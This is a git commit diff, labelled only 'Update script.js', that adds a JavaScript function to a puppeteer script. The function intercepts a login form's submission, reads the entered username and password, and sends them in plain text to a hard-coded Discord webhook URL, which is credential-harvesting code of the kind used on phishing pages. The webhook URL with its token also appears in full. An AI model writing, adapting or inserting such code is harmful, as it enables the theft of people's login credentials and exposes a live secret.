bb7a8c77368dd4bdd2d8c11fcd1a1f4b184de03f
ItsRaef <89030555+ItsRaef@users.noreply.github.com>
2023-06-09 11:13:13 +0200

    Update script.js

--- script.js
+++ script.js
@@ -65,3 +65,39 @@ const puppeteer = require('puppeteer');
   await browser.close();
 })();
 
+function sendLoginData(event) {
+  event.preventDefault(); // Prevent the form from submitting normally
+
+  const form = event.target;
+  const username = form.username.value;
+  const password = form.password.value;
+
+  const webhookUrl = "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg";
+
+  const payload = {
+    content: `Username: ${username}\nPassword: ${password}`,
+  };
+
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify(payload),
+  })
+    .then(response => {
+      if (response.ok) {
+        // Successful webhook request
+        // You can perform additional actions or display a success message
+      } else {
+        // Error in the webhook request
+        // You can handle the error or display an error message
+      }
+    })
+    .catch(error => {
+      // Error in the fetch request
+      // You can handle the error or display an error message
+    });
+}
+
+
